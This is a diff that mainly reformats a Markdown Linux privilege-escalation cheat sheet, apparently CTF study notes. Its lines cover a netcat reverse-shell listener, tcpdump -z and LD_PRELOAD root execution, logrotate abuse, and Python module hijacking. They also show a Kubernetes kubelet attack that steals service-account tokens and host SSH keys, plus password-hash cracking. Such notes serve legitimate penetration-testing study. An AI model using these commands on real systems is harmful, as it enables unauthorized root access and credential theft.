@@ -74,7 +74,7 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 ---
 
 # **1. Manual enumeration / Information Gathering**
-Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
+(check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`))
 
   **System (host / kernel / arch)**
 
@@ -223,18 +223,15 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 ---
 
 # 2. **SUDO**
-  * List commands we can run with sudo.
+  List commands we can run with sudo.
     ```bash
     sudo -l
     ```
     ```bash
     cat /etc/sudoers
     ```
-
-  **Ex → tcpdump:**
-
-  * **tcpdump**
-
+    
+  * **Ex → tcpdump:**
     ```bash
     sudo -l
     '
@@ -243,11 +240,9 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
     '
     ```
 
-    **tcpdump with -z, tcpdump has the -z flag:**
-    **`-z postrotate-command`**
-    Allows executing an external command after rotating a ***.pcap*** file. If we control the value of **-z**, we can execute any script or command as root.
+    * **tcpdump with -z, tcpdump has the -z flag:** **`-z postrotate-command`** Allows executing an external command after rotating a ***.pcap*** file. If we control the value of **-z**, we can execute any script or command as root.
 
-    On our terminal we open a Listener:
+    * On our terminal we open a Listener:
     **`nc -lvnp 4444`**
 
     On the target:
@@ -271,12 +266,10 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
   ---
 
-  If we get **PRELOAD** in the response (**`env_keep+=LD_PRELOAD`)**, we can exploit like this:
+  * **Ex → LD_PRELOAD:**
 
-  * **LD_PRELOAD**
-
+    *  If we get **PRELOAD** in the response (**`env_keep+=LD_PRELOAD`)**.
     * environment variable that allows loading custom shared libraries before the program's standard libraries. This can be exploited to execute arbitrary code with elevated privileges.
-
     * After that, we write **`shell.c`** that elevates privileges:
 
       ```c
@@ -308,7 +301,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
 ---
 
-* 3. **SUID / SGID**
+# 3. **SUID / SGID**
 
   * Allows the program to be executed with the same permissions as the Owner (remember to use the full **PATH**).
 
@@ -326,7 +319,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
 ---
 
-* 4. **Capabilities**
+# 4. **Capabilities**
 
   * When specific privileges are granted to a user to perform tasks.
 
@@ -344,7 +337,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
 ---
 
-* 5. **Cron Jobs**
+# 5. **Cron Jobs**
 
   * Scripts or commands set to run at specific times, by default they run with the owner's privileges.
 
@@ -404,7 +397,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
 ---
 
-* 6. **PATH**
+# 6. **PATH**
 
   * Environment variable listing directories. Basically when we type a command without specifying its directory, the system will look through the list of PATH directories; we can then add a directory at the beginning of the list and execute a command/program.
 
@@ -434,7 +427,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
 ---
 
-* 7. **NFS**
+# 7. **NFS**
 
   * **NFS (Network File Sharing)** → protocol that allows mounting remote file systems so they can be accessed as if local. Basically when there is a directory on the target machine that allows sharing with other computers, then we create a share with our machine and in that share we create a file that executes with root permissions and also set the +s bit, thus on the target machine we can execute that file and escalate to root.
 
@@ -474,7 +467,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
 ---
 
-* 8. Write permission on **/etc/passwd**
+# 8. Write permission on **/etc/passwd**
 
   ```bash
   ls -l /etc/passwd
@@ -489,7 +482,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
 ---
 
-* 9. **Groups** (LXD, Docker, Disk, Adm)
+# 9. **Groups** (LXD, Docker, Disk, Adm)
 
   Run **`id`** and see if we are in any of the groups below:
 
@@ -668,7 +661,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
     ---
 
-    ## 🛑 Notes
+    ## Notes
 
     * Always try to exploit **mounted volumes first**, then `docker.sock`, then the `docker` group.
     * Privileged containers allow mounting the host `/`: this gives **full root access**.
@@ -707,7 +700,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
 ---
 
-* 10. **Others..**
+# 10. **Others..**
 
   * Screen (`screen -v`)
 
@@ -737,7 +730,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
     cat /etc/cron.daily/logrotate
     ```
 
-    📌 *Why?*
+    *Why?*
 
     Cron usually runs `logrotate` as **root**. This is important because **even if the user does not have root privileges**, if they can manipulate the files monitored by `logrotate`, the process **can perform actions on their behalf as root**.
 
@@ -750,7 +743,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
     ls /etc/logrotate.d/
     ```
 
-    📌 *Why?*
+    *Why?*
 
     These files show which **logs are being monitored** and how. Each entry defines a log path (e.g., `/var/log/nginx/*.log`) and associated rules (frequency, permissions, compression, etc.).
 
@@ -782,12 +775,12 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
     * `create`: after rotating, **creates a new log file** with the specified permissions.
 
-      * 🛑 If the user can manipulate this, they can force the **creation of arbitrary files**.
+       If the user can manipulate this, they can force the **creation of arbitrary files**.
     * `compress`: after rotating, **compresses the old log**.
 
-      * ⚠️ Can be exploited in cases where compression invokes system utilities with controllable input.
+      * Can be exploited in cases where compression invokes system utilities with controllable input.
 
-    📌 *Why does this matter?*
+    *Why does this matter?*
 
     If logrotate is configured to **create new files as root**, but the user controls the log path, they can cause **creation of files in arbitrary locations as root**, for example `/etc/cron.d/backdoor`.
 
@@ -817,7 +810,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
     }
     ```
 
-    📌 *Why?*
+    *Why?*
 
     Here we see that:
 
@@ -826,7 +819,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
     * The new file is created with permission `0640` and owner `www-data` (e.g., web server)
     * A script is executed after rotation (`postrotate`)
 
-    ⚠️ If the user is `www-data`, they can write to that log, which is processed by a script **running as root** → **super dangerous**.
+    If the user is `www-data`, they can write to that log, which is processed by a script **running as root** → **super dangerous**.
 
     ---
 
@@ -837,7 +830,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
     journalctl | grep logrotate
     ```
 
-    📌 *Why?*
+    *Why?*
 
     Checks if it is running via cron or manually. This helps predict **when your payload will be processed** (e.g., when forcing rotation with `logrotate -f` during testing).
 
@@ -849,7 +842,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
     echo "Malicious log injected by $(whoami)" >> /var/log/target.log
     ```
 
-    📌 *Why?*
+    *Why?*
 
     If the log is **referenced in a logrotate configuration file** and you can write to it, it is possible to exploit rotation to manipulate files on the system (e.g., write to cron, .ssh, etc.).
 
@@ -861,7 +854,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
     cat /var/lib/logrotate/status
     ```
 
-    📌 *Why?*
+    *Why?*
 
     You can see when the last rotation occurred. This helps know if a new execution is near (daily, weekly, etc.).
 
@@ -874,7 +867,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
     sudo logrotate -f /etc/logrotate.conf  # force rotation
     ```
 
-    📌 *Why?*
+    *Why?*
 
     * `-d` shows what would be done, useful to understand the flow.
     * `-f` forces rotation and can help test during a CTF or HTB box if you have limited sudo.
@@ -885,17 +878,17 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
   * **Kubernetes**
 
-    ## 🔍 1. Check access to the Kubelet API
+    ## 1. Check access to the Kubelet API
 
     ```bash
     curl -k https://<IP>:10250/pods | jq .
     ```
 
-    ✅ If it returns a `PodList`, you have **anonymous access to the Kubelet API**.
+    If it returns a `PodList`, you have **anonymous access to the Kubelet API**.
 
     ---
 
-    ## 📦 2. List Pods with `kubeletctl`
+    ## 2. List Pods with `kubeletctl`
 
     Install (if necessary):
 
@@ -911,17 +904,17 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
     ---
 
-    ## ⚠️ 3. Look for Pods vulnerable to RCE
+    ## 3. Look for Pods vulnerable to RCE
 
     ```bash
     kubeletctl -i --server <IP> scan rce
     ```
 
-    ✅ Look for `RCE: +` → that pod allows remote command execution.
+    Look for `RCE: +` → that pod allows remote command execution.
 
     ---
 
-    ## 💥 4. Execute commands in the pod (as root)
+    ## 4. Execute commands in the pod (as root)
 
     ```bash
     kubeletctl -i --server <IP> exec "id" -p <pod_name> -c <container_name>
@@ -931,7 +924,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
     ---
 
-    ## 🎯 5. Steal the Service Account Token and Certificate
+    ## 5. Steal the Service Account Token and Certificate
 
     ```bash
     kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <container> | tee k8.token
@@ -941,7 +934,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
     ---
 
-    ## 🔑 6. Test token permissions via `kubectl`
+    ## 6. Test token permissions via `kubectl`
 
     ```bash
     export token=$(cat k8.token)
@@ -952,11 +945,11 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
             auth can-i --list
     ```
 
-    🔍 Check if the token has permission to create pods, read secrets, etc.
+    Check if the token has permission to create pods, read secrets, etc.
 
     ---
 
-    ## 🧬 7. Create a malicious Pod mounting the host root
+    ## 7. Create a malicious Pod mounting the host root
 
     **privesc.yaml**:
 
@@ -983,7 +976,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
     ---
 
-    ## 🚀 8. Deploy the malicious Pod
+    ## 8. Deploy the malicious Pod
 
     ```bash
     kubectl --token=$token \
@@ -994,17 +987,17 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
     ---
 
-    ## 🔓 9. Access sensitive host files
+    ## 9. Access sensitive host files
 
     ```bash
     kubeletctl -i --server <IP> exec "cat /mnt/host/root/.ssh/id_rsa" -p privesc -c privesc
     ```
 
-    ☠️ Now you have **read the real host filesystem as root**.
+    Now you have **read the real host filesystem as root**.
 
     ---
 
-    # 📘 Quick Reference Table
+    # Quick Reference Table
 
     | Step | Goal                     | Main Command                    |
     | ---- | ------------------------ | ------------------------------- |
@@ -1094,22 +1087,22 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
     ---
 
-    ### 🚩 **INDICATORS / QUICK CHECKLIST:**
+    ### **INDICATORS / QUICK CHECKLIST:**
 
-    1. 🔍 **Python file executed as root?**
+    1. **Python file executed as root?**
 
        ```bash
        ls -l script.py
        sudo -l
        ```
 
-    2. 🔍 **Script imports third-party libraries?**
+    2. **Script imports third-party libraries?**
 
        ```bash
        grep import script.py
        ```
 
-    3. 🔍 **Are any import folders writable?**
+    3. **Are any import folders writable?**
 
        ```bash
        python3 -c 'import sys; print("\n".join(sys.path))'
@@ -1123,7 +1116,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
        ls -ld /tmp
        ```
 
-    4. 🔍 **Is any `.py` library used by the script editable?**
+    4. **Is any `.py` library used by the script editable?**
 
        ```bash
        grep -r "def" /path/to/module/
@@ -1132,9 +1125,9 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
     ---
 
-    ### 🧪 **IF ANY OF THE ABOVE INDICATORS CONFIRM...**
+    ### **IF ANY OF THE ABOVE INDICATORS CONFIRM...**
 
-    ### 🧨 **OPTION A – Direct hijack of an editable module**
+    ### **OPTION A – Direct hijack of an editable module**
 
     ```python
     def virtual_memory():
@@ -1142,33 +1135,33 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
         os.system("id")
     ```
 
-    📦 Overwrite the real function in the vulnerable library with your version.
+    Overwrite the real function in the vulnerable library with your version.
 
     ---
 
-    ### 📁 **OPTION B – Path Hijacking (directory above the real one with write permission)**
+    ### **OPTION B – Path Hijacking (directory above the real one with write permission)**
 
     ```bash
     cd /usr/lib/python3.8/
     echo 'def virtual_memory(): import os; os.system("id")' > psutil.py
     ```
 
-    🧠 Python loads the highest priority version in `sys.path`.
+    Python loads the highest priority version in `sys.path`.
 
     ---
 
-    ### 🌍 **OPTION C – Hijack via PYTHONPATH with SETENV**
+    ### **OPTION C – Hijack via PYTHONPATH with SETENV**
 
     ```bash
     echo 'def virtual_memory(): import os; os.system("id")' > /tmp/psutil.py
     sudo PYTHONPATH=/tmp/ /usr/bin/python3 script.py
     ```
 
-    💡 Works only if `sudo -l` shows `SETENV`.
+    Works only if `sudo -l` shows `SETENV`.
 
     ---
 
-    ## 🔒 **POST-EXPLOITATION / ROOT SHELL**
+    ## **POST-EXPLOITATION / ROOT SHELL**
 
     Replace `os.system("id")` with:
 
@@ -1179,7 +1172,7 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
     ---
 
-    ## 🧠 QUICK MEMORY — KEY COMMANDS:
+    ## QUICK MEMORY — KEY COMMANDS:
 
     | Step                            | Command                                     |
     | ------------------------------- | ------------------------------------------- |
@@ -1271,15 +1264,3 @@ Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 ---
 
 **`unshadow passwd.txt shadow.txt > passwords.txt`** → joins users with the encrypted passwords into the file passwords.txt, now just run John to try to crack.
-
-
-
-
-
-
-
-
-
-
-
-
